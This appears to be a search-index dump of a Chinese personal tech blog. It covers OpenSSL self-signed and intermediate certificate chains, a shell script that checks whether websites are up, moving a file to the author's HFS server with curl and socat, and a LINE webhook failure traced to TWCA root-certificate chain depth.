https://localhost curl 成功 ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:2:1","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"產生中繼憑證 openssl genrsa -out intermediate.key 4096 一樣我AES256拿掉 我就是不想打密碼，我就爛XD #CN 我設定 a.localhost 網域 openssl req -sha256 -new -key intermediate.key -out intermediate.csr vim intermediate.ext intermediate.ext內容貼上去 [ intermediate_ca ] subjectKeyIdentifier = hash authorityKeyIdentifier = keyid:always,issuer basicConstraints = CA:true, pathlen:0 為什麼要自己定義呢？ 用原本的 v3_ca 不好嗎？ 當然，如果你想要讓這個 CA 跟 Root CA 一樣可以繼續往下簽 Intermediate CA 的話，那你可以選擇繼續使用 v3_ca。 上面定義的 intermediate_ca 相較預設的 v3_ca 多了一個 pathlen:0，表示他往下還可以有 0 個 Intermediate CA（也就是沒有的意思）。 openssl x509 -req -in intermediate.csr \\ -CA ca.pem -CAkey ca.key \\ -CAserial ca.serial -CAcreateserial \\ -days 730 \\ -extensions intermediate_ca -extfile intermediate.ext \\ -out intermediate.pem 其中有幾個選項需要介紹一下： -CAserial ca.serial： 每個 CA 簽發憑證時都需要一個流水號，這裡是指出流水號記錄檔檔名 -CAcreateserial： 只有當 CA 初次簽發時需要，他會初始化一個流水號出來，第二次之後簽發就不要帶這個參數，以免流水號被重置 -extensions intermediate_ca： 我們想要指定剛剛我們建立的 extension -extfile intermediate.ext： 需要指定包含 extension 的設定檔 # 查看中繼憑證 openssl x509 -noout -text -in intermediate.pem 可以看到 Issuer 是我們 Root CA 的名稱，而 Subject 是 CSR 中填寫的內容。 並且有將 pathlen 設為 0，表示這個 CA 只能用來簽發終端憑證。 另外，我們還可以透過 openssl verify 驗證這個憑證是不是由 Root CA 一路發下來的。 openssl verify -CAfile ca.pem intermediate.pem # intermediate.pem: OK 一樣我把中繼憑證複製到 Apache 測試 https://a.localhost OK(更換憑證設定我就不寫了) ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:2:2","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"產生終端憑證 # -aes256 拿掉，不解釋 openssl genrsa -out endentity.key 4096 # 這次我 CN = a.a.localhost openssl req -sha256 -new -key endentity.key -out endentity.csr # 中繼憑證簽發終端憑證 openssl x509 -req -in endentity.csr \\ -CA intermediate.pem -CAkey intermediate.key \\ -CAserial intermediate.serial -CAcreateserial \\ -days 365 \\ -out endentity.pem # 查看憑證 openssl x509 -noout -text -in endentity.pem # 檢查憑證鍊 openssl verify -CAfile ca.pem -untrusted intermediate.pem endentity.pem 這邊因為有 Apache/nginx 中繼憑證 所以在設定上會不太一樣 Apache 有特別設定方法，這邊就不仔細說原因了 SSLCertificateFile /home/vagrant/test/endentity.pem SSLCertificateKeyFile /home/vagrant/test/endentity.key SSLCertificateChainFile /home/vagrant/test/intermediate.pem Nginx/Apache 都可以把中繼憑證包在一起 # cat endentity.pem \u003e web.crt # cat intermediate.pem \u003e\u003e web.crt cat endentity.pem intermediate.pem \u003e web.crt Apache 設定 SSLCertificateFile /home/vagrant/test/web.crt SSLCertificateKeyFile /home/vagrant/test/endentity.key #SSLCertificateChainFile /home/vagrant/test/intermediate.pem curl https://a.a.localhost/ 顯示正常 ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:2:3","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"wildcard 以下教學使用使用 OpenSSL 製作萬用字元 SSL 憑證-黑暗執行緒 2017 年 Chrome 58 / Firefox 48 開始要求憑證必須改用 SubjectAltName 欄位提供主機名稱 ，否則將顯示為不安全 ========= 犯錯區 Start ========= 這邊修改 *.localhost,*.*.localhost,*.*.*.localhost 網域 這邊後續我有繼續做，一直失敗，差點要放棄 過程是這樣的 我把localhost-ext.cnf 把 *.localhost 單獨一個 結果失敗了 我把 SNA 只留 *.localhost 還是失敗了 我把 SNA 放 *.localhost, localhost 也是失敗了 我把 Apache conf 設定家 Servername localhost Serveralias localhost *.localhost 還是失敗了 … Generating and Installing Wildcard and Multi-Domain SSL Certificates | DeveloperSide.NET openssl verify -CAfile ca.pem -untrusted intermediate.pem localhost.crt 這一段沒有錯，但還是跑出這個錯誤 curl -v https://a.a.localhost subjectAltName does not match a.a.localhost SSL: no alternative certificate subject name matches target host name ‘a.a.localhost’ 跟別的網站不一樣 subjectAltName: host “xxx.xxxxx.com.tw” matched cert’s “*.xxxxx.com.tw” apache error log AH01909: 127.0.1.1:443:0 server certificate does NOT include an ID which matches the server name 後來求助偉大的谷歌，發現原來是nginx的TLS SNI support功能沒開，SNI （服務器名字指示）不開啟的話，一個IP只支持一個SSL證書，不支持多個證書，而服務器是yum安裝的nginx，默認TLS SNI support是關閉的，重新編譯nginx並指定openssl庫後，TLS SNI support 開啟了，訪問就正常了 記錄一次升級https走過的坑-czwanga-51CTO博客 … …. ….. 總之努力不一定會成功，不努力就一定很輕鬆 各位 Bye 剛好最近看到【Fun科學】靈壓探測器(潛伏身邊的不明危機！) - YouTube 為了不浪費大家的時間，我最後解決了，整理一下發生了什麼原因 這邊修改 *.localhost,*.*.localhost,*.*.*.localhost 網域 這邊我犯了很嚴重錯誤 這邊萬用網域也不是可以隨便用網址 需要使用一級網域做萬用憑證 EX:*.localhost.com \u003c==== 這邊一級網域應該是指 萬用憑證 不是只 SNA 萬用憑證也只能用一層，所以*.*.localhost.com,*.*.*.localhost.com (應該不行，我沒有實驗) 正確來說 現在萬用憑證不看 CN 了，現在瀏覽器都會看 SNA 是否正確 SNA 算是 憑證 x509 插件 有實驗 *.a.localhost.com 是可以跑了 因為 localhost.com 網域 DNS 會抓不到 所以我們先手動設定 /etc/hosts 設定 127.0.0.1 localhost.com 家如要新增 a.localhost.com 也要獨立新增 127.0.0.1 a.localhost.com SNA 也能設定 *.a.localhost.com ，沒有一級網域限制 以上是我實驗結果 參考資料 OpenSSL SAN 证书 - Fantasy 這邊裡面有介紹 SNA 萬用字元憑證只能覆蓋一級子域 萬用字元憑證 - 維基百科，自由的百科全書 Wildcard Domains: Wildcard domains such as *.example.com are useful when protecting multiple services on one domain such as www.example.com, mail.example.com, mx.example.com, ftp.example.com, blog.example.com, etc. however it has several limitations: Non-zero length subdomain: first is that many sites will use a combination of www.example.com and example.com and a *.example.com wildcard will not match the latter. Only flat subdomain support: wildcards will not support multiple subdomains, for example *.m.example.com will not be matched by *.example.com. Only one domain: finally, *.example.com will not support an entirely different subdomain such as foobar.com Subject Alternative Name: Using the X.509 subjectAltName extension has been useful to address some of the limiations of wildcard domains, namely they can contain multiple FQDNs of all types so names with differing numbers of subdomains and entirely different domains can be suppored. To make SANs even more useful, the goal of this effort was to validate the support for using wildcard domain names in the SAN. 參考來源:Wildcard Subject Alternate Name SSL/TLS Certificates ========= 犯錯區 End ========= 這邊拿剛剛上面中繼憑證繼續用 # 建立私鑰 openssl genrsa -out localhost.key 2048 # 設定 localhost.cnf vim localhost.cnf localhost.cnf [req] default_bits = 2048 prompt = no default_md = sha256 distinguished_name = dn [dn] C=TW ST=Taiwan L=Taipei O=localhost OU=localhost CA emailAddress=nobody@localhost CN=*.localhost.com # 產出 CSR openssl req -new -sha256 -nodes -key localhost.key -out localhost.csr -config localhost.cnf vim localhost-v3.cnf localhost-v3.cnf keyUsage = critical,digitalSignature,keyEncipherment extendedKeyUsage = serverAuth,clientAuth subjectKeyIdentifier = hash basicConstraints=CA:FALSE subjectAltName = @alt_names [alt_names] DNS.1 = *.localhost.com DNS.2 = localhost.com DNS.3 = *.a.localhost.com 這邊因為中途失敗一直嘗試更改，所以跟darkthread-net-v3.ext 不太一樣 authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment subjectAltName = @alt_names [alt_names] DNS.1 = *.darkthread.net # 拿掉 -CAcreateserial # -CAserial intermediate.serial 需要指定序號，後面參數指的是序號檔名 o","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:3:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"TWCA 憑證為什麼有三層，四層串到同一個憑證呢? 我目前猜想其中兩邊憑證都是吃同一把私鑰 產生兩組 crt(public key) 所以憑證都可以用 openssl x509 -req -in intermediate.csr \\ -CA ca.pem -CAkey ca.key \\ -CAserial ca.serial \\ -days 730 \\ -extensions intermediate_ca -extfile intermediate.ext \\ -out intermediate2.pem 2020-07-22 最後這篇有和我同學討論 我認為跟用同一個私金鑰產生有關係 他認為公鑰解析出來應該跟 pin sha256 一樣有關係 (當時看圖片沒注意到) 不過我們加密學都不是很懂，這邊就不繼續研究了 至於抓兩個路徑 我目前猜測四層憑證第二層對應上去都是 TWCA Global Root CA 除了中繼憑證跟電腦跟憑證 Mapping 到名子對應上去剛好符合驗證解密內容 四層憑證在 Windows 看是四層，但用在 Firefox,Linux(Chrome),Android(Chrome) 來看竟然是抓到三層 總結心得 當出現網站不安全，都是無法串連(client)根憑證有關係 根憑證正確就往下追中繼憑證，中繼憑證順序都需要注意 中繼憑證可以不用附根憑證(畢竟裝置有根憑證，沒必要再傳送過去) 但我這個案例比較特別，正常應該不會遇到 裝置有兩個 TWCA 根憑證，正常應該不會遇到問題 就算裝置有三層根憑證，也通吃 但是裝置只有四層根憑證，就會出現不安全!!!(像 LINE Webhook 就沒有 TWCA 三層憑證) 不過還是看到滿多網站都掛四層憑證居多 可以到很多銀行、醫院網站看看憑證 把 apache 設定 endentity.pem 對應 intermediate2.pem 真得可以用 ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:4:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"測試檔案 所有範例下載 /vagrant/ \u003c====== 第一段建立憑證範例 /vagrant/test/ \u003c====== 第二、三段建立中繼、萬用憑證範例 hosts 參考 dns 設定檔 default-ssl.conf apache 設定檔 ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:5:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"查看 web 上驗憑證內容 openssl s_client -connect localhost.com:443 \u003c/dev/null | openssl x509 -noout -text | less openssl s_client -connect youtube.com:443 \u003c/dev/null | openssl x509 -noout -text | less ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:6:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"其他資源 Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落 [Server] TLS/SSL憑證(Certificate)常用指令 – 製作CSR – YIDAS Code [推薦] 快速產生本地端開發用SSL憑證工具-mkcert | 辛比誌 2020 大改造宅宅雲架構系列文-5 窮人版 PKI - Phil Workspace 備份圖 裡面有提到 CRL 使用 Openssl 建立憑證 | Raix’s Blog 備份圖 這邊也有提到 CRL rfc 5280 X.509 PKI 解析 - charlieroro - 博客园 被撤 SSL Certificate ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:7:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"最近專案 Server 特別多… 所以在想有什麼腳本可以快速確認服務正常 又爬文整理一下 主要是參考這篇 6 Methods to Quickly Check if a Website is up or down from the Linux Terminal | 2daygeek.com 主要參考 # vi curl-url-check-1.sh #!/bin/bash for site in www.google.com google.co.in www.xyzzz.com do if curl -I \"$site\" 2\u003e\u00261 | grep -w \"200\\|301\" ; then echo \"$site is up\" else echo \"$site is down\" fi echo \"----------------------------------\" done 最後只需要# sh curl-url-check-1.sh 就能測試了 ","date":"2020-07-15","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/:0:0","tags":["shell","web"],"title":"監控多個網頁腳本(Shell)","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/"},{"categories":["Linux"],"content":"我簡單修改 #!/bin/bash url_list=( # web https://***.jsp https://***.jsp https://***.jsp https://***.jsp https://***.jsp http://1***.jsp http://1***.jsp # api https://***.jsp https://***.jsp https://***.jsp https://***.jsp https://***.jsp http://1***.jsp http://1***.jsp ) for site in \"${url_list[@]}\" do if curl -k -i \"$site\" 2\u003e\u00261 | grep -w \"200\\|301\" ; then echo \"$site is up\" else echo \"$site is down\" fi echo \"----------------------------------\" done ","date":"2020-07-15","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/:1:0","tags":["shell","web"],"title":"監控多個網頁腳本(Shell)","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/"},{"categories":["Linux"],"content":"加入顏色 太多了，眼睛看的不是很舒服 #!/bin/bash COLOR_REST='\\e[0m'; COLOR_GREEN='\\e[0;32m'; COLOR_RED='\\e[0;31m'; url_list=( # WEB https://***.jsp https://***.jsp https://***.jsp https://***.jsp http://1***.jsp http://1***.jsp # API https://***.jsp https://***.jsp https://***.jsp https://***.jsp http://1***.jsp http://1***.jsp ) for site in \"${url_list[@]}\" do if curl -k -i \"$site\" 2\u003e\u00261 | grep -w \"200\\|301\" ; then echo -e \"$site is ${COLOR_GREEN}up${COLOR_REST}\" else echo -e \"$site is ${COLOR_RED}down${COLOR_REST}\" fi echo \"----------------------------------\" done 完成，愉悅 XD 6 Methods to Quickly Check if a Website is up or down from the Linux Terminal | 2daygeek.com 裡面還有fping 但好像無法對單一網址 所以就沒繼續研究 ","date":"2020-07-15","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/:2:0","tags":["shell","web"],"title":"監控多個網頁腳本(Shell)","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/"},{"categories":["Linux"],"content":"最近要使用 Linux 下載憑證下來看 主機沒有裝 vsftpd 想說用 WinSCP 下載 但又發現沒有使用 root 權限無法進去資料夾 有想到有沒有 sudo 方法 Winscp使用sudo user登录-阿里云开发者社区 但不太想改這個設定… 最後突然想到有 Windows HFS 來接檔案 原本有想到 nc 接檔案，但好像很麻煩 哈哈 Ubuntu 用 nc 指令互傳檔案 Windows 也沒 nc 指令 非常簡單 curl -F fileupload1=@filename -F press=\"Upload files\" http://IP:Port/Dir/ 記得資料夾要設定上傳 anyone 原理可以看curl upload file @ 495884965 :: 痞客邦 :: #curl -v -F ‘file=@/tmp/444.jpg’ -b cookies.txt -c cookies.txt https://your.web.site/upload 其中，file要看該網頁的變數名稱決定 例如： \u003cform method=post enctype=multipart/form-data\u003e \u003cp\u003e\u003cinput type=file name=file_name\u003e \u003cinput type=submit value=Upload\u003e \u003c/form\u003e 用curl時，就要變成file_name 我還以為 @ 是多餘的 最後成功 最後有爬到upload with filename inside URL The curl command shown below without an ending “/” after the \u003cHFSfolder\u003e works better in that it return the “301” code to the console when everything works properly (with an ending “/” you get the echo of the HFS html upload page, the upload still works fine, but having the return code available to any error checking in a script is probably be better). You probably know better than I why there is this slight difference between having the “/” at the end and not having it. curl -F fileupload1=@MyFile.iso -F press=\"Upload files\" http://\u003cHFSipaddress\u003e/\u003cHFSfolder\u003e I’ve tested curl ability to take input from stdin via a command, for example, like this: cat testfile.gz | curl -F fileupload1=@-;filename=atestfile.gz -F press=\"Upload files\" http://\u003cHFSipaddress\u003e/\u003cHFSfolder\u003e ","date":"2020-07-15","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-command-line-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E5%88%B0-HFS/:0:0","tags":["linux","hfs","curl"],"title":"使用 command line 上傳檔案到 HFS","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-command-line-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E5%88%B0-HFS/"},{"categories":["Linux"],"content":"socat 大法 on host 1 socat -u open:myfile.exe,binary tcp-listen:999 on host 2 socat -u tcp:host1:999 open:myfile.exe,create,binary 參考:socat 使用手册 « 倾旋的博客 ","date":"2020-07-15","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-command-line-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E5%88%B0-HFS/:1:0","tags":["linux","hfs","curl"],"title":"使用 command line 上傳檔案到 HFS","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-command-line-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E5%88%B0-HFS/"},{"categories":["Linux"],"content":"最近要上線的專案會用到 LINE WEBHOOK 竟然上正式環境 line 後台 webhook 模擬可以觸發 API 但使用行動裝置竟然不可以打…(access.log沒有收到訊息) 我們公司有防火牆、Server Load Balancer… 查詢上花了不少時間 由於流程很多，我上面就直接講重點 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:0:0","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"檢查方向 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:1:0","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"LINE 文章有提到注意事項 在設定HTTPS伺服器時，有下列幾點必須注意的事項： HTTPS伺服器所使用的根憑證（Root CA）必須是在LINE平台的白名單列表中，否則LINE平台會拒絕傳送訊息。在白名單列表中大多數的憑證都需要付費申請，但是LINE平台也支援常用的免費憑證，例如Let’s Encrypt。 請勿使用已知具有安全性漏洞的協定（例如SSL v2或SSL v3）或Cipher Suite（例如SWEET32或CVE-2016-2183）。 請務必正確設定中繼憑證（Intermediate certificate），以避免無法對應到根憑證而發生錯誤。這是最常見的問題通報狀況，請在設定HTTPS伺服器時多加留意。 開發LINE聊天機器人不可不知的十件事 - LINE ENGINEERING 我們公司瀏覽器看網頁沒有跳出安全性問題，Android、Iphone、Linux 也沒有問題 所以第一項認為沒問題，但魔鬼出在細節裡 文章裡的根憑證白名單列表看不見 Google 一下會發現 TWCA 沒有這個憑證，後面再詳細說明 developers.line.biz/media/messaging-api/build-bot/ca_root_v2.txt 總之我們前面認為這一段沒有問題 2,3 憑證都確認都沒有問題 SSL Certificate Comparison and Reviews 這個網站就可以檢查憑證是否有問題 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:1:1","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"Load Balance SNI 設定 當我們憑證出問題的時候 網路同仁有打電話給 Load Balance 廠商詢問設定 廠商提到要設定 SNI 讓我想到之前驗證環境的問題 Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記 原來 Apache 做的設定，對應 LB(負載平衡)機器也要做這些設定 但遺憾還是沒有解決問題 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:1:2","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"根憑證是否為裝置(Client)認證 前面第一點已經據透了 我們發現驗證環境的萬用憑證可以跑 但是正式環境驗證憑證不可以跑 原來公司舊有憑證是四層(TWCA) 但是新憑證是三層(TWCA) 這2種都是合法憑證 從憑證路徑可以看到一個三層，一個四層 但偏偏 LINE ROOT CA 只有CN=TWCA Root Certification Authority, OU=Root CA, O=TAIWAN-CA, C=TW 沒有 TWCA ROOT CA 公司剛好因為換新憑證都改用三層 所以會有這個問題… 所以中繼憑證改成四層就沒這個問題 完美成果 root ca 包在中繼憑證，順序錯誤 root ca 包在中繼憑證+中繼憑證順序錯誤 我的建議憑證包四層比較不會出問題 因為第二層憑證是一樣的 第三層的話，Root CA 就會抓到白名單 假如四層的話，中繼串到第三個後面，就是白名單 不過 TWCA 說最新發的都是三層??這原因我就沒深入追查 產生自簽憑證筆記 | TWCA 憑證為什麼有三層，四層串到同一個憑證呢? 我猜應該相同名字會抓出來比較 剛好兩張私鑰都是一樣的 題外話，這邊我發現有趣現象 用 Firefox 是三層(沒有看到四層)，Chrome(IE,Window)是四層 不知道是不是憑證是用 名稱去找的 這個是我猜的，目前沒有找到資訊 憑證簽發者(ISSUER)的名稱與憑證主體(Subject Name)名稱相同! 參考:憑證串鍊的解釋 - SSL憑證推薦網 | SSL憑證 | code Sign 難道真的是看名字?? Android也是三層 剛好有抓到 TWCA Root CA 根憑證所以才三層 至於怎麼抓的就不研究了 現在回想萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記 是不是沒有串到根憑證??現在也查不到了 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:1:3","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"檢查 Chipser 那些關於SSL/TLS的二三事(九) — SSL (HTTPS)Communication | by Carl | Medium Apache進階設定(1) - TLSv1.2 TLSv1.1 SSLv2 SSLv3 - BrilliantCode.net 之前有聽說可以不戴加密做 TLS 有看到這個關鍵字 null cipher suites 不知道是不是指這個? 我就不詳細研究了 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:1:4","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"名詞整理 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:0","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"根憑證 Self-Signed CA 亦可稱為 root CA。由於此種 CA 所發的憑證(certificate)是不經由任何上層 CA 所認證，而是以「自行認證」的方式進行認證。因此像是最上層的商業 CA，或是自行架設內部認證用的 CA，都可以屬於此類。 參考來源: Certificate Authority(CA) 憑證簡介 @ MISTECH 技術手抄本 :: 痞客邦 :: 簡單來說就是根憑證，一開始你的電腦微軟附的作業系統裡面，有裝一些憑證，隨著系統更新，這些憑證都會update。 根憑證因為沒有上層，所以你電腦有根憑證白名單，就會算是合法的憑證。 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:1","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"中繼憑證 參考來源:那些關於SSL/TLS的二三事(十二) — Chain of Trust | by Carl | Medium 這篇說得很清楚，但我也只是略懂略懂 一直在想為什麼會有中繼憑證，缺少中繼憑證會發生什麼事?順序錯會發生什麼事? 當前憑證並非是 Root CA 認證而是靠中繼憑證… 中繼憑證會再往上根 Root Ca 驗證 到白名單就是安全性任憑正 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:2","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"憑證加密過程 簡單說就是 公鑰 + 上層憑證私鑰 = 憑證 這張憑證就會給你設定 Apache 上 驗證憑證會跟上層憑證公鑰解開加密確認值 一致就確認沒問題，繼續往上面憑證追查，直到 Root CA 